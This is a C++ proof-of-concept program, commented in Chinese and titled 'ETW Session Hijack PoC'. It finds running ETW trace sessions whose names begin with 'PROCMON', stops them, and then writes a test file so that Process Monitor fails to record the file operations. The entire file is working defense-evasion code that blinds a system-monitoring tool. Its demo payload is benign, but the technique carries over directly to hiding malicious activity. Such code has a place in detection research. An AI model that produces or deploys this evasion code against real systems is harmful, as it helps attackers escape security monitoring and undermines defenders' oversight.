#include <windows.h>
#include <evntrace.h>
#include <tdh.h>        // for additional error codes, optional
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "advapi32.lib")

// 停止指定名称的ETW跟踪会话
ULONG StopTraceSessionByName(const std::wstring& sessionName)
{
    ULONG status = ControlTraceW(0, sessionName.c_str(), nullptr, EVENT_TRACE_CONTROL_STOP);
    if (status == ERROR_SUCCESS) {
        std::wcout << L"[+] Successfully stopped session: " << sessionName << std::endl;
    }
    else {
        std::wcerr << L"[-] Failed to stop session " << sessionName
            << L", error: " << status << std::endl;
    }
    return status;
}

// 枚举所有正在运行的ETW跟踪会话
void EnumerateAndStopProcMonSessions()
{
    ULONG bufferSize = 0;
    QueryAllTracesW(nullptr, 0, &bufferSize);
    if (bufferSize == 0) {
        std::wcout << L"[*] No active trace sessions found." << std::endl;
        return;
    }

    std::vector<BYTE> buffer(bufferSize);
    PEVENT_TRACE_PROPERTIES pProps = reinterpret_cast<PEVENT_TRACE_PROPERTIES>(buffer.data());
    ULONG status = QueryAllTracesW(&pProps, bufferSize, &bufferSize);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[-] QueryAllTraces failed: " << status << std::endl;
        return;
    }

    // 通过 Wnode.BufferSize 遍历连续的结构体
    PEVENT_TRACE_PROPERTIES pCurrent = pProps;
    while ((PBYTE)pCurrent < (PBYTE)pProps + bufferSize) {
        std::wstring sessionName = std::wstring(pCurrent->LoggerNameOffset
            ? reinterpret_cast<LPCWSTR>(reinterpret_cast<BYTE*>(pCurrent) + pCurrent->LoggerNameOffset)
            : L"");

        if (_wcsnicmp(sessionName.c_str(), L"PROCMON", 7) == 0) {
            std::wcout << L"[!] Found ProcMon session: " << sessionName << std::endl;
            StopTraceSessionByName(sessionName);
        }

        // 移动到下一个结构体：当前地址 + Wnode.BufferSize
        pCurrent = reinterpret_cast<PEVENT_TRACE_PROPERTIES>(
            reinterpret_cast<BYTE*>(pCurrent) + pCurrent->Wnode.BufferSize
            );
    }
}

// 测试函数：创建文件，写入内容，关闭文件
void DoFileOperations()
{
    std::cout << "[*] Performing file operations..." << std::endl;

    HANDLE hFile = CreateFileA("C:\\Users\\Public\\stealth_test.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateFile failed: " << GetLastError() << std::endl;
        return;
    }

    const char* data = "This file operation should be invisible to ProcMon.\r\n";
    DWORD bytesWritten;
    WriteFile(hFile, data, static_cast<DWORD>(strlen(data)), &bytesWritten, NULL);
    CloseHandle(hFile);

    std::cout << "[+] File written and closed." << std::endl;
}

int main()
{
    std::cout << "==== ETW Session Hijack PoC ====" << std::endl;
    std::cout << "Make sure ProcMon is currently capturing events." << std::endl;
    std::cout << "Press ENTER to stop ProcMon's ETW session...";
    std::cin.get();

    EnumerateAndStopProcMonSessions();

    DoFileOperations();

    std::cout << "Now check ProcMon: the CreateFile/WriteFile/CloseFile events should be MISSING." << std::endl;
    std::cout << "Press ENTER to exit.";
    std::cin.get();
    return 0;
}
